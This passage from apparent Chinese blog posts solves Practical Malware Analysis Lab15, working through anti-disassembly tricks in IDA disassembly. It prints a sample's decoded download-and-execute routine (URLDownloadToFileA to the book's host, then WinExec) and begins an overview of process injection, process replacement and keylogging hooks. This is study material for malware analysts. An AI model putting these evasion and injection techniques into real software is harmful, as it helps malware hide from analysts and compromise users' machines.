fs:[0]<br>mov eax, [eax]<br>mov eax, [eax]<br>mov fs:[0], eax<br>add esp, 8<br></code></pre></td></tr></table></figure><p><strong>挫败栈帧分析：</strong>先进的反汇编器能够通过分析一个函数中指令推导出函数栈的结构，这使得反汇编器能够显示局部变量及函数相关的参数。这些信息对恶意代码分析人员非常有价值，它使得分析人员一次分析一个函数，并且可以更好的理解函数的输入输出及结构，然而通过一个函数来确定它的栈帧结构并不十分科学，与反汇编的很多其他因素一样，用来决定栈帧结构的算法必须做出某些假设与合理猜想，但是这很容易被有经验的恶意代码编写者利用。挫败栈帧分析也可以阻止特定的技术分析操作，其中最明显的时IDA反编译插件，他可以产生一个函数的类C语言伪代码。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab15-1"><a href="#Lab15-1" class="headerlink" title="Lab15-1"></a>Lab15-1</h3><p><strong>分析样本Lab15-01.exe它是一个命令行程序，它接收一个参数，如果这个参数与一个秘密代码相匹配，程序会输出”Good Job！”。</strong></p><p><strong>问题</strong></p><p><strong>1.这个二进制程序中使用了哪种防反汇编技术？</strong></p><p>此程序使用了永假条件分支技术例如如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040100C                 xor     eax, eax<br>.text:0040100E                 jz      short near ptr loc_401010+1<br>.text:00401010<br>.text:00401010 loc_401010:                             ; CODE XREF: _main+E↑j<br>.text:00401010                 call    near ptr 8B4C55A0h<br></code></pre></td></tr></table></figure><p>由于在0040100C 处清空了eax，所以下面的jz指令必定会执行，但是指向的位置却又错误，将00401010处代码属性修改为数据然后跳过一个字节使用C将后续的数据重新修改为代码可以得到修改之后的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040100C                 xor     eax, eax<br>.text:0040100E                 jz      short loc_401011<br>.text:0040100E ; ---------------------------------------------------------------------------<br>.text:00401010                 db 0E8h<br>.text:00401011 ; ---------------------------------------------------------------------------<br>.text:00401011<br>.text:00401011 loc_401011:                             ; CODE XREF: _main+E↑j<br>.text:00401011                 mov     eax, [ebp+arg_4]<br>.text:00401014                 mov     ecx, [eax+4]<br>.text:00401017                 movsx   edx, byte ptr [ecx]<br>.text:0040101A                 cmp     edx, 70h<br>.text:0040101D                 jnz     short loc_40105E<br>.text:0040101F                 xor     eax, eax<br>.text:00401021                 jz      short loc_401024<br></code></pre></td></tr></table></figure><p><strong>2.这个二进制程序中使用了什么流氓机器码来欺骗反汇编过程？</strong></p><p>可见0E8h是用于干扰IDA分析的无用数据。</p><p><strong>3.这个反汇编技术被用了多少次？</strong></p><p>5</p><p><strong>4.什么命令行参数会让程序输出”Good Job!”?</strong></p><p>修改完成后将修改的部分选中按P键使IDA将区间内代码识别为一个函数就能得出函数逻辑了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( argc != <span class="hljs-number">2</span> || *argv[<span class="hljs-number">1</span>] != <span class="hljs-number">112</span> || argv[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] != <span class="hljs-number">113</span> || argv[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] != <span class="hljs-number">100</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(aSonIAmDisappoi);<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(Format);<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以应该输入<code>pdq</code>。</p><h3 id="Lab15-2"><a href="#Lab15-2" class="headerlink" title="Lab15-2"></a>Lab15-2</h3><p><strong>分析恶意代码文件Lab15-02.exe。要回答下列问题，请在分析二进制文件前，修正所有的反汇编技术。</strong></p><p>跟上一题类似，看到由错误的引用就先修正为数据然后在恰当的位置起始修改为代码，完成之后p一下修复成函数。</p><p><strong>问题</strong></p><p><strong>1.程序初始化请求的URL是什么？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040138F                 db  68h ; h<br>.text:00401393                 db  74h ; t<br>.text:00401397                 db  74h ; t<br>.text:0040139B                 db  70h ; p<br>.text:0040139F                 db  3Ah ; :<br>.text:004013A3                 db  2Fh ; /<br>.text:004013A7                 db  2Fh ; /<br>.text:004013AB                 db  77h ; w<br>.text:004013AF                 db  77h ; w<br>.text:004013B3                 db  77h ; w<br>.text:004013B7                 db  2Eh ; .<br>.text:004013BB                 db  70h ; p<br>.text:004013BF                 db  72h ; r<br>.text:004013C3                 db  61h ; a<br>.text:004013C7                 db  63h ; c<br>.text:004013CB                 db  74h ; t<br>.text:004013CF                 db  69h ; i<br>.text:004013D3                 db  63h ; c<br>.text:004013D7                 db  61h ; a<br>.text:004013DB                 db  6Ch ; l<br>.text:004013DF                 db  6Dh ; m<br>.text:004013E3                 db  61h ; a<br>.text:004013E7                 db  6Ch ; l<br>.text:004013EB                 db  77h ; w<br>.text:004013EF                 db  61h ; a<br>.text:004013F3                 db  72h ; r<br>.text:004013F7                 db  65h ; e<br>.text:004013FB                 db  61h ; a<br>.text:004013FF                 db  6Eh ; n<br>.text:00401403                 db  61h ; a<br>.text:00401407                 db  6Ch ; l<br>.text:0040140B                 db  79h ; y<br>.text:0040140F                 db  73h ; s<br>.text:00401413                 db  69h ; i<br>.text:00401417                 db  73h ; s<br>.text:0040141B                 db  2Eh ; .<br>.text:0040141F                 db  63h ; c<br>.text:00401423                 db  6Fh ; o<br>.text:00401427                 db  6Dh ; m<br>.text:0040142B                 db  2Fh ; /<br>.text:0040142F                 db  62h ; b<br>.text:00401433                 db  61h ; a<br>.text:00401437                 db  6Dh ; m<br>.text:0040143B                 db  62h ; b<br>.text:0040143F                 db  6Fh ; o<br>.text:00401443                 db  6Fh ; o<br>.text:00401447                 db  2Eh ; .<br>.text:0040144B                 db  68h ; h<br>.text:0040144F                 db  74h ; t<br>.text:00401453                 db  6Dh ; m<br>.text:00401457                 db  6Ch ; l<br></code></pre></td></tr></table></figure><p><strong>2.User-Agent域时如何产生的？</strong></p><p>伪C代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> &amp;&amp; name[i]; ++i )<br>&#123;<br><span class="hljs-keyword">switch</span> ( name[i] )<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">90</span>:<br>          name[i] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">122</span>:<br>          name[i] = <span class="hljs-string">&#x27;a&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">57</span>:<br>          name[i] = <span class="hljs-string">&#x27;0&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>          ++name[i];<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3.初始化请求时，程序在内存页中查找什么？</strong></p><p>程序会在缓冲区中寻找字符串<code>Bamboo::</code>的位置并提取<code>Bamboo::</code>字符串之后的内容</p><p><strong>4.程序如何处理它从页中提取的信息？</strong></p><p>程序会调用函数sub_40130F :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040130F                 push    ebp<br>.text:00401310                 mov     ebp, esp<br>.text:00401312                 sub     esp, 18h<br>.text:00401315                 mov     [ebp+Src], &#x27;A&#x27;<br>.text:00401319                 mov     [ebp+var_17], &#x27;c&#x27;<br>.text:0040131D                 mov     [ebp+var_16], &#x27;c&#x27;<br>.text:00401321                 mov     [ebp+var_15], &#x27;o&#x27;<br>.text:00401325                 mov     [ebp+var_14], &#x27;u&#x27;<br>.text:00401329                 mov     [ebp+var_13], &#x27;n&#x27;<br>.text:0040132D                 mov     [ebp+var_12], &#x27;t&#x27;<br>.text:00401331                 mov     [ebp+var_11], &#x27; &#x27;<br>.text:00401335                 mov     [ebp+var_10], &#x27;S&#x27;<br>.text:00401339                 mov     [ebp+var_F], &#x27;u&#x27;<br>.text:0040133D                 mov     [ebp+var_E], &#x27;m&#x27;<br>.text:00401341                 mov     [ebp+var_D], &#x27;m&#x27;<br>.text:00401345                 mov     [ebp+var_C], &#x27;a&#x27;<br>.text:00401349                 mov     [ebp+var_B], &#x27;r&#x27;<br>.text:0040134D                 mov     [ebp+var_A], &#x27;y&#x27;<br>.text:00401351                 mov     [ebp+var_9], &#x27;.&#x27;<br>.text:00401355                 mov     [ebp+var_8], &#x27;x&#x27;<br>.text:00401359                 mov     [ebp+var_7], &#x27;l&#x27;<br>.text:0040135D                 mov     [ebp+var_6], &#x27;s&#x27;<br>.text:00401361                 mov     [ebp+var_5], &#x27;.&#x27;<br>.text:00401365                 mov     [ebp+var_4], &#x27;e&#x27;<br>.text:00401369                 mov     [ebp+var_3], &#x27;x&#x27;<br>.text:0040136D                 mov     [ebp+var_2], &#x27;e&#x27;<br>.text:00401371                 mov     [ebp+var_1], 0<br>.text:00401375                 lea     eax, [ebp+Src]<br>.text:00401378                 push    eax             ; Src<br>.text:00401379                 call    ds:_strdup<br>.text:0040137F                 add     esp, 4<br>.text:00401382                 mov     esp, ebp<br>.text:00401384                 pop     ebp<br>.text:00401385                 retn<br></code></pre></td></tr></table></figure><p>将读取的数据流写入文件<code>Account Summary.xls.exe</code>，调用<code>ShellExecuteA</code>执行文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004012EF                 push    0Ah             ; nShowCmd<br>.text:004012F1                 push    0               ; lpDirectory<br>.text:004012F3                 push    0               ; lpParameters<br>.text:004012F5                 mov     eax, [ebp+Filename]<br>.text:004012FB                 push    eax             ; lpFile<br>.text:004012FC                 push    0               ; lpOperation<br>.text:004012FE                 push    0               ; hwnd<br>.text:00401300                 call    ds:ShellExecuteA<br></code></pre></td></tr></table></figure><h3 id="Lab15-3"><a href="#Lab15-3" class="headerlink" title="Lab15-3"></a>Lab15-3</h3><p><strong>分析恶意代码文件Lab15-03.exe。乍一看这个二进制程序似乎是一个合法工具，但实际上他的功能远远超过它所告知的功能。</strong></p><p><strong>问题</strong></p><p><strong>1.恶意代码怎样被初始化调用？</strong></p><p>翻了一下发现了一段比较奇怪的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004014C0 loc_4014C0:                             ; DATA XREF: .text:loc_401497↑o<br>.text:004014C0                 mov     esp, [esp+8]<br>.text:004014C4                 mov     eax, large fs:0<br>.text:004014CA                 mov     eax, [eax]<br>.text:004014CC                 mov     eax, [eax]<br>.text:004014CE                 mov     large fs:0, eax<br>.text:004014D4                 add     esp, 8<br>.text:004014D4 ; ---------------------------------------------------------------------------<br>.text:004014D7                 db 0EBh<br>.text:004014D8 ; ---------------------------------------------------------------------------<br>.text:004014D8                 inc     eax<br>.text:004014DA                 dec     eax<br>.text:004014DB                 call    $+5<br>.text:004014E0                 push    ebp<br>.text:004014E1                 mov     ebp, esp<br>.text:004014E3                 push    ebx<br>.text:004014E4                 push    esi<br>.text:004014E5                 push    edi<br>.text:004014E6                 push    offset unk_403010<br>.text:004014EB                 call    sub_401534<br>.text:004014F0                 add     esp, 4<br>.text:004014F3                 push    offset unk_403040<br>.text:004014F8                 call    sub_401534<br>.text:004014FD                 add     esp, 4<br>.text:00401500                 push    0<br>.text:00401502                 push    0<br>.text:00401504                 push    offset unk_403040<br>.text:00401509                 push    offset unk_403010<br>.text:0040150E                 push    0<br>.text:00401510                 call    URLDownloadToFileA<br>.text:00401515                 jz      short loc_40151A<br>.text:00401517                 jnz     short loc_40151A<br>.text:00401517 ; ---------------------------------------------------------------------------<br>.text:00401519                 db 0E8h<br>.text:0040151A ; ---------------------------------------------------------------------------<br>.text:0040151A<br>.text:0040151A loc_40151A:                             ; CODE XREF: .text:00401515↑j<br>.text:0040151A                                         ; .text:00401517↑j<br>.text:0040151A                 push    0<br>.text:0040151C                 push    offset unk_403040<br>.text:00401521                 call    ds:WinExec<br>.text:00401527                 push    0<br>.text:00401529                 call    ds:ExitProcess<br>.text:0040152F ; ---------------------------------------------------------------------------<br>.text:0040152F                 pop     edi<br>.text:00401530                 pop     esi<br>.text:00401531                 pop     ebx<br>.text:00401532                 pop     ebp<br></code></pre></td></tr></table></figure><p>两段偏移分别如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:00403010 unk_403010      db  97h                 ; DATA XREF: .text:004014E6↑o<br>.data:00403010                                         ; .text:00401509↑o<br>.data:00403011                 db  8Bh<br>.data:00403012                 db  8Bh<br>.data:00403013                 db  8Fh<br>.data:00403014                 db 0C5h<br>.data:00403015                 db 0D0h<br>.data:00403016                 db 0D0h<br>.data:00403017                 db  88h<br>.data:00403018                 db  88h<br>.data:00403019                 db  88h<br>.data:0040301A                 db 0D1h<br>.data:0040301B                 db  8Fh<br>.data:0040301C                 db  8Dh<br>.data:0040301D                 db  9Eh<br>.data:0040301E                 db  9Ch<br>.data:0040301F                 db  8Bh<br>.data:00403020                 db  96h<br>.data:00403021                 db  9Ch<br>.data:00403022                 db  9Eh<br>.data:00403023                 db  93h<br>.data:00403024                 db  92h<br>.data:00403025                 db  9Eh<br>.data:00403026                 db  93h<br>.data:00403027                 db  88h<br>.data:00403028                 db  9Eh<br>.data:00403029                 db  8Dh<br>.data:0040302A                 db  9Ah<br>.data:0040302B                 db  9Eh<br>.data:0040302C                 db  91h<br>.data:0040302D                 db  9Eh<br>.data:0040302E                 db  93h<br>.data:0040302F                 db  86h<br>.data:00403030                 db  8Ch<br>.data:00403031                 db  96h<br>.data:00403032                 db  8Ch<br>.data:00403033                 db 0D1h<br>.data:00403034                 db  9Ch<br>.data:00403035                 db  90h<br>.data:00403036                 db  92h<br>.data:00403037                 db 0D0h<br>.data:00403038                 db  8Bh<br>.data:00403039                 db  8Bh<br>.data:0040303A                 db 0D1h<br>.data:0040303B                 db  97h<br>.data:0040303C                 db  8Bh<br>.data:0040303D                 db  92h<br>.data:0040303E                 db  93h<br>.data:0040303F                 db 0FFh<br>.data:00403040 unk_403040      db    0                 ; DATA XREF: .text:004014F3↑o<br>.data:00403040                                         ; .text:00401504↑o ...<br>.data:00403041                 db  8Ch<br>.data:00403042                 db  8Fh<br>.data:00403043                 db  90h<br>.data:00403044                 db  90h<br>.data:00403045                 db  93h<br>.data:00403046                 db  8Ch<br>.data:00403047                 db  8Dh<br>.data:00403048                 db  89h<br>.data:00403049                 db 0D1h<br>.data:0040304A                 db  9Ah<br>.data:0040304B                 db  87h<br>.data:0040304C                 db  9Ah<br>.data:0040304D                 db 0FFh<br>.data:0040304E                 db    0<br></code></pre></td></tr></table></figure><p>猜测使对这两段数据进行了解密，于是放到x32dbg中下断看一下：</p><p>触发条件是除零异常，可见代码实现了自己的异常处理函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040149C                 push    large dword ptr fs:0<br>.text:004014A3                 mov     large fs:0, esp<br>.text:004014AA                 xor     ecx, ecx<br>.text:004014AC                 div     ecx<br></code></pre></td></tr></table></figure><p><strong>2.恶意代码都做了什么？</strong></p><p>下载了一个文件并启动它。</p><p><strong>3.恶意代码使用了什么URL？</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">004014E6</span> | <span class="hljs-number">68</span> <span class="hljs-number">10304000</span>              | push lab15-<span class="hljs-number">03</span>.<span class="hljs-number">403010</span>                    | <span class="hljs-number">403010</span>:<span class="hljs-string">&quot;http://www.practicalmalwareanalysis.com/tt.html&quot;</span><br></code></pre></td></tr></table></figure><p><code>http://www.practicalmalwareanalysis.com/tt.html</code></p><p><strong>4.恶意代码使用了什么文件名？</strong></p><p>由于网页已经不可访问，所以调试的时候应该修改一下代码，最后得出的文件名如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00403040</span>  FF <span class="hljs-number">73</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>F <span class="hljs-number">6</span>F <span class="hljs-number">6</span>C <span class="hljs-number">73</span> <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">2</span>E <span class="hljs-number">65</span> <span class="hljs-number">78</span> <span class="hljs-number">65</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ÿspoolsrv.exe...  <br></code></pre></td></tr></table></figure><p><code>spoolsrv.exe</code></p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>反汇编</tag>
      
      <tag>防反汇编技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐蔽的恶意代码启动</title>
    <link href="/2019/03/%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/"/>
    <url>/2019/03/%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>启动器：</strong>启动器，也称为加载器，是一种设置自身或者其他恶意代码片段以到达即时或将来秘密运行的恶意代码。启动器经常回在资源节包含要加载的恶意代码。如果资源节被压缩或者加密，则恶意代码必须在加载前对资源节进行提取操作，因此可以在代码中看到<code>FindResource</code>、<code>LoadResource</code>、以及<code>SizeofResource</code>等API函数。恶意代码通常需要管理员权限才能进行下面介绍的操作。</p><p><strong>进程注入：</strong>隐藏启动行为的最流行的技术是进程注入，这是一种将代码注入到另外一个正在运行的进程中，而被注入的进程会不知不觉地运行注入地代码。执行进程注入通常用到如下API：<code>VirtualAllocEx</code>用来分配一块内存空间、<code>WriteProcessMemory</code>用来想之前分配地地址空间内写入数据。</p><p><strong>DLL注入：</strong>DLL注入是进程注入地一种形式，它强迫一个远程进程加载DLL程序，同时它也是最常使用地的隐秘加载技术。DLL注入将代码注入到一个远程进程并让远程进程调用<code>LoadLibrary</code>，从而强制远程进程加载一个DLL程序到它的进程上下文，一旦被感染的进程加载了恶意DLL，系统会自动调用<code>DLLMain</code>函数。注入的DLL与被注入DLL的进程拥有相同的权限。</p><span id="more"></span><p><strong>DLL注入流程：</strong></p><ul><li><code>CreateToolhelp32Snapshot</code>、<code>Process32First</code>和<code>Process32Next</code>来查找进程列表中的目标进程。</li><li>启动器提取目标进程的PID并调用<code>OpenProcess</code>以获取进程的句柄。</li><li><code>CreateRemoteThread</code>函数在远程进程中创建一个新的线程（<code>CreateRemoteThread</code>的三个参数：<code>hProcess</code>进程句柄、<code>lpStartAddress</code>注入线程的入口点、<code>hpparameter</code>线程的参数）。</li><li><code>VirtualAllocEx</code>为恶意DLL名字字符创建内存空间，或者在远程进程中分配内存空间。</li><li><code>WriteProcessMemory</code>将DLL的名字字符串写入到分配的内存空间中。</li></ul><p><strong>直接注入：</strong>直接注入在远程进程的内存空间中分配和插入代码，与DLL注入不同的是这些恶意代码不是在DLL文件中而是直接写入的。直接注入比DLL注入更为灵活，且一般用于注入编译过的代码如<code>ShellCode</code>。在应用直接注入技术的恶意代码中，尽成灰发现如下三个函数：<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>和<code>CreateRemoteThread</code>。通常会有两次<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>的调用，第一次是分配内存空间并写入远程线程使用的数据。第二次分配内存空间并写入远程新城代码。<code>CreateRemoteThread</code>调用远程线程代码的位置<code>lpStartAddress</code>和数据<code>lpParameter</code>。</p><p><strong>进程替换：</strong>使用进程替换方法可以将一个可执行文件重写到一个运行进程的内存空间，当恶意代码编写者想要将恶意代码伪装成一个合法的进程，并不会产生DLL注入可能会让进程崩溃的危险时，他们呢会使用进程替换技术。进程替换技术的关键是以挂起状态创建一个线程，这个程序将不做任何事情，恢复主线程后才开始执行。几次呢很难过替换技术可以将一个进程载入内存并在入口点挂起它。</p><p><strong>进程替换流程：</strong></p><ul><li>创建一个进程。</li><li>用恶意的可执行文件替换受害者进程的内存空间，使用<code>ZwUnmapViewOfSection</code>来释放由参数指向的所有内存。</li><li>使用<code>VirtualAllocEx</code>为恶意代码分配新的内存。</li><li>调用<code>ResumeThread</code>函数初始化恶意代码并执行。</li></ul><p><strong>钩子（Hook）注入：</strong>Hook注入使用Windows Hook加载恶意代码，恶意代码用它拦截发往某个应用程序的消息，Hook注入一般有如下作用：</p><ul><li>保证无论如何拦截到一个特殊消息，恶意代码都会被运行。</li><li>保证一个特殊的DLL被载入到受害进程的内存空间。</li></ul><p>本地Hook和远程Hook：</p><ul><li>本地Hook用来观察和操纵发往进程内部的消息。</li><li>远程Hook用来观察和操纵一个发往远程进程的消息（系统中的另一个进程），有两种形式，上层和底层，上层的Hook要求Hook例程是DLL程序的一个导出函数，他被操作系统映射到被挂钩的线程或系统所有线程的进程地址空间。底层Hook则要求Hook例程被保护在安装Hook的进程中，这个例程在操作系统获得处理事件的机会前被通知。</li></ul><p><strong>Hook技术的击键记录器：</strong>Hook技术可以被用来记录按键。击键可以有WH_KEYBOARD和WH_KEYBOARD_LL的Hook例程类型来注册上层和底层Hook。</p><p>使用SetWindowsHookEx：这是用来执行远程Windows 